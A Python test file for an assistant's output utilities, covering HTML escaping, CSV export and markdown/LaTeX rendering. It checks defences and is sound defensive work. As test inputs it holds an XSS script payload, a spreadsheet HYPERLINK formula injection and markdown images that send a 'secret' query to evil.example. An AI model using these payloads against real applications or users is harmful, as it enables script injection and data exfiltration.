from utils import esc, format_step, rows_to_csv


def test_esc_neutralises_html():
    out = esc('<script>alert(1)</script><img src=x onerror="y">')
    assert "<" not in out and ">" not in out and '"' not in out


def test_format_step_escapes_and_adds_icon():
    out = format_step("🔧 Using tool: `wikipedia` with query: `<b>x</b>`")
    assert "📖 wikipedia" in out and "<b>" not in out


def test_csv_blocks_formula_injection():
    data = rows_to_csv([("2026-01-01", "=HYPERLINK(\"http://evil\")", "+1+1", "none", 3)]).decode()
    assert "'=HYPERLINK" in data and "'+1+1" in data
    assert data.splitlines()[0] == "Timestamp,Question,Answer,Tools Used,Tokens"


def test_render_answer_latex_money_and_images():
    from utils import render_answer
    block = render_answer(r"\[ N_2 + 3H_2 \rightleftharpoons 2NH_3 \]")
    assert block == r"$$N_2 + 3H_2 \rightleftharpoons 2NH_3$$"
    assert render_answer(r"The ion \( Ni^{2+} \) is green") == r"The ion $Ni^{2+}$ is green"
    assert render_answer("costs $5 and $10") == r"costs \$5 and \$10"
    multi = render_answer("\\[\na = b\n\\]")
    assert multi == "$$a = b$$"
    assert render_answer("see ![alt text](https://evil.example/p.png?q=secret) here") == "see alt text here"
    assert render_answer("![pic][1]\n\n[1]: https://evil.example/x.png").startswith("pic")
    assert "[link](https://arxiv.org/abs/1)" in render_answer("[link](https://arxiv.org/abs/1)")
    assert render_answer("plain text") == "plain text"
